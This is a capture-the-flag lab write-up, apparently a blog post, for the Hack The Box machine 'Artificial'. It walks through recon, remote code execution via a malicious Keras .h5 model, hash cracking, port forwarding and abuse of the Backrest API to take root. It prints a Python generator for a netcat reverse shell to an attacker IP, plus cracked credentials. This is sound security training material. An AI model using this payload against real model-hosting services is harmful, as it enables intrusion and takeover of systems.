---
title: 'HTB-Artificial'
published: 2025-06-25
draft: false
toc: true
tags: ['docker', 'tensorflow', 'Ligolo', 'backrest']
---

```
Scope:
10.10.11.74
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -vvvv -p- -Pn -T5 --min-rate=5000 artificial

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/TCP - HTTP

![](attachments/710947ba6f1c7aff23474efd0f8fa657.png)

![](attachments/b40d1ac9eb7d71440eb82f0e11ffd19e.png)

![](attachments/fc60b91f6d9fa27928064fa8e2fcb1f1.png)

Anyhow we go to the `/register` page where we can easily sign up with a new account and log in afterwards:

![](attachments/6572c0c0846b4df3eedd5e3e5eacb5d2.png)

### Burpsuite

I launch `burp` so I can view the request better:

![](attachments/b0b86d9b3833818edb7b55494bd9fef4.png)

![](attachments/ead5d20af8e5b4771f597808d2b814c1.png)

So instead what we'll want to do is create a valid `.h5` file with our reverse shell in it, upon file upload and running it on the client we should get **RCE**.

### docker

The `Dockerfile` that we find on the web page contains the instructions that we need to follow:

![](attachments/4580785073ebd2eea724ba125119fdfb.png)

![](attachments/a0bcfa3bd65c3f18cee043135edec092.png)

So we'll have to craft up the docker container:

![](attachments/caef7159fd897948b0d1bc2617f4b08b.png)

Now we can go ahead and supply it our `python` code which will generate a malicious `h5` file:

```python
# gen.py

import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 80 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Inside the `docker` container we will then craft it:

![](attachments/343b68976be47a8efe045983a643fd27.png)

We can now upload and run it in order to get **RCE**.

# Foothold
## Shell as app

I now upload the model:

![](attachments/2906881484f3f77ebefe80858901e9d6.png)

And click on **View Predictions**:

![](attachments/ee27e46060c5484b0db6f8975cb86c6d.png)

Just like that we get a reverse shell!

![](attachments/781234dface9c8a8ab70c611d1746a66.png)

I notice there's a user on the system called *gael*.

![](attachments/1742a982087e150ad1927768cd706969.png)

*gael* was also part of the *sysadm* group, would be nice to move laterally to him.

Inside `/opt` I find the following:

![](attachments/9073cfa2429ad83f543e57d71f691beb.png)

This looks interesting for later on.

## Enumeration

![](attachments/62e9b840f45231d66b4f6370ad93fcd0.png)

![](attachments/70a5fd6ca4ac6063033a3193d6133a93.png)

![](attachments/bc081107843880280ddc3ec9e7e715aa.png)

Unfortunate.

![](attachments/c8f54652e8b0b2063db16f2a85d372e0.png)

Time to check out the `/opt` directory.

![](attachments/b46ad59db252f1c0bea8669ace22ece7.png)

:::note
This led to a whole lot of nothing, instead I went on to enumerate where i landed in the first place
:::

### SQLite DB

![](attachments/e204989cbfa0a0de00db80b3f1ced917.png)

I found the above in one of the subdirectories. I transfered the file over and used `sqlite` to read it.

![](attachments/827e4be2b53fe69f66e030d9ea011bfc.png)

I then went on and used [crackstation](https://crackstation.net/) to crack the hashes:

![](attachments/cdefe677de202ef6837b3efe510b648c.png)

```
gael
mattp005numbertwo
```

## Lateral Movement

I used the first one in the table that corresponded to *gael* to log in via `ssh`.

![](attachments/3f33479608b55f1a86acbe4f08dd16c8.png)

### user.txt

![](attachments/26643dc64de7d94306213491af4a69b6.png)

# Privilege Escalation
## sysadm group

There's only 1 file that we actually have access to being part of this custom group:

![](attachments/462d50a48d68f46669412d0adfb986e9.png)

I went ahead and copied it over and extracted it:

![](attachments/e708f9e030f86f2faa07d962d9836179.png)

![](attachments/a15e69d685b979633df753e61a1c2349.png)

In here we find the following juicy stuff:

![](attachments/aa94d05b0cb8eff8404c5c4f31dbb575.png)

It appears to be a `base64` encrypted `bcrypt` hash, let's crack it.

![](attachments/784578801a21811ab64133a993e1750d.png)

```
backrest_root
!@#$%^
```

EZ PZ.

:::fail
Not so fast, unfortunately this password did not give us *root* access:
![](attachments/eb9bc664b355ae9316a7ecd8c849ca1c.png)
:::

## Port Forwarding 

I then realized that I needed the password elsewhere, I'm supposed to port forward the local `9898` port for the **backrest** api so I can reach it from Kali.

![](attachments/e37e2b95a52eeef66c47d09d75764c04.png)

For this I downloaded over the `ligolo agent`:

![](attachments/433ea7d37cd0279967afd0399e6c15aa.png)

![](attachments/cd03f74b25f8ea3b524c23f97081fb5b.png)

![](attachments/0c9d91075734682cfd578a940148a48b.png)

![](attachments/a5118eb35a4fc2524dee08e4af2a1fc0.png)

## Backrest API

Now I could reach the port on `240.0.0.1:9898`:

![](attachments/c36000be3c3e46741ce123408369977a.png)

And we get inside with the previously found creds:

![](attachments/d1a9271e6ed0b6d6b2af3f7ae02b0056.png)

Here we fill out the following, and leave the rest as default

![](attachments/71430450de9bf4a4926c1a0e270457d6.png)

Now we can use the following to run commands:

![](attachments/7d5c2fc100a07796f1db61bb1f30a576.png)

Using the `help` command we can get a list of all available commands:

![](attachments/c98ba9a757e200f8a0806700bdcc0b06.png)

This way we can go ahead and use the following to back up *root*'s `.ssh` folder:

![](attachments/7771911dcbf36c910e3d98989c92dffc.png)

Next up we can check the mentioned snapshot:

![](attachments/5011bceb0e672febc56488b5b07624b8.png)

We can dump the `id_rsa`:

![](attachments/d1b7bcbfe8f451a7c6e0cccf148b7851.png)

## ssh as root

![](attachments/576b4baa1442519ff44ba6f63d2e3c51.png)

### root.txt

![](attachments/dbf8f4c8329d0986889426c5a0f92121.png)

![](attachments/9f53574f1323a3f4c706c924811101b8.png)

---
